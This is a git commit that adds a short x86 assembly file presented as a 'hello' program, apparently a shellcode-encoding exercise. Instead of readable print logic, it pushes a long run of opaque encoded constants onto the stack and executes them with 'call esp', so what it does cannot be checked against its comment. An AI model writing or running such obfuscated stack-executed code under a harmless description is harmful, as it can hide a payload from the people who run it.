c805370afa54f7640a019363bd0dbdfe0a661c9d
Crypt00o <octopus2672001@gmail.com>
2022-08-22 15:57:53 +0200

    added hello.asm

---
+++ hello.asm
@@ -0,0 +1,42 @@
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;          hello_iam_crypto.asm                                    ;
+;   [+] Hello Iam Crypt00o #                                       ;
+; if you run this code you will get :                              ;
+;                                                                  ;
+;                                                                  ;
+; [+] Hello Iam Crypt00o #                                         ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+ xor eax,eax
+ push eax
+ push 0xd4ff5eed
+ push 0x75d13941
+ push 0x12345678
+ push 0x8c3481ab
+ push 0xcdabcd8c
+ push 0x348111b2
+ push 0xc931d231
+ push 0x62c83d84
+ push 0x686bc834
+ push 0x846883d9
+ push 0x95e568cd
+ push 0x91de9568
+ push 0xd196cd85
+ push 0x68c9808f
+ push 0xf66889d9
+ push 0x90dd6899
+ push 0x9695cd68
+ push 0xf1919cfc
+ push 0x68d19591
+ push 0xd06899a4
+ push 0xd6ee68a4
+ push 0x4b1c3c68
+ push 0xbd49fc06
+ push 0x6879c87d
+ push 0x786870c8
+ push 0x268468b8
+ push 0x492f8468
+ push 0xb9f97d78
+ push 0x6850c031
+ call esp
